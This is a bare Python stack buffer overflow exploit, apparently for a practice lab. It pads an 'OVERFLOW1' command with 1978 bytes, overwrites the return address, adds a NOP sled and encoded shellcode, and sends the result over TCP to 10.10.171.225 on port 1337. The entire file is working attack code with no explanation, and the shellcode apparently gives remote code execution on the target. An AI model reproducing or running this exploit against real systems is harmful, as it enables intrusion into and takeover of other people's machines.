#!/usr/bin/python3

import sys, socket

overflow = (b"\xbf\x4d\x50\x7f\x1b\xdb\xc8\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
b"\x52\x31\x78\x12\x83\xc0\x04\x03\x35\x5e\x9d\xee\x39\xb6\xe3"
b"\x11\xc1\x47\x84\x98\x24\x76\x84\xff\x2d\x29\x34\x8b\x63\xc6"
b"\xbf\xd9\x97\x5d\xcd\xf5\x98\xd6\x78\x20\x97\xe7\xd1\x10\xb6"
b"\x6b\x28\x45\x18\x55\xe3\x98\x59\x92\x1e\x50\x0b\x4b\x54\xc7"
b"\xbb\xf8\x20\xd4\x30\xb2\xa5\x5c\xa5\x03\xc7\x4d\x78\x1f\x9e"
b"\x4d\x7b\xcc\xaa\xc7\x63\x11\x96\x9e\x18\xe1\x6c\x21\xc8\x3b"
b"\x8c\x8e\x35\xf4\x7f\xce\x72\x33\x60\xa5\x8a\x47\x1d\xbe\x49"
b"\x35\xf9\x4b\x49\x9d\x8a\xec\xb5\x1f\x5e\x6a\x3e\x13\x2b\xf8"
b"\x18\x30\xaa\x2d\x13\x4c\x27\xd0\xf3\xc4\x73\xf7\xd7\x8d\x20"
b"\x96\x4e\x68\x86\xa7\x90\xd3\x77\x02\xdb\xfe\x6c\x3f\x86\x96"
b"\x41\x72\x38\x67\xce\x05\x4b\x55\x51\xbe\xc3\xd5\x1a\x18\x14"
b"\x19\x31\xdc\x8a\xe4\xba\x1d\x83\x22\xee\x4d\xbb\x83\x8f\x05"
b"\x3b\x2b\x5a\x89\x6b\x83\x35\x6a\xdb\x63\xe6\x02\x31\x6c\xd9"
b"\x33\x3a\xa6\x72\xd9\xc1\x21\x77\x1a\xe7\xd7\xef\x20\xf7\x06"
b"\xac\xad\x11\x42\x5c\xf8\x8a\xfb\xc5\xa1\x40\x9d\x0a\x7c\x2d"
b"\x9d\x81\x73\xd2\x50\x62\xf9\xc0\x05\x82\xb4\xba\x80\x9d\x62"
b"\xd2\x4f\x0f\xe9\x22\x19\x2c\xa6\x75\x4e\x82\xbf\x13\x62\xbd"
b"\x69\x01\x7f\x5b\x51\x81\xa4\x98\x5c\x08\x28\xa4\x7a\x1a\xf4"
b"\x25\xc7\x4e\xa8\x73\x91\x38\x0e\x2a\x53\x92\xd8\x81\x3d\x72"
b"\x9c\xe9\xfd\x04\xa1\x27\x88\xe8\x10\x9e\xcd\x17\x9c\x76\xda"
b"\x60\xc0\xe6\x25\xbb\x40\x06\xc4\x69\xbd\xaf\x51\xf8\x7c\xb2"
b"\x61\xd7\x43\xcb\xe1\xdd\x3b\x28\xf9\x94\x3e\x74\xbd\x45\x33"
b"\xe5\x28\x69\xe0\x06\x79")

shellcode = b"A" * 1978 + b"\xaf\x11\x50\x62" + b"\x90" * 32 + overflow

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.10.171.225',1337))

	payload = b"OVERFLOW1 " + shellcode
	
	s.send((payload))
	s.close()

except:
	print ("Error connecting to server")
	sys.exit()
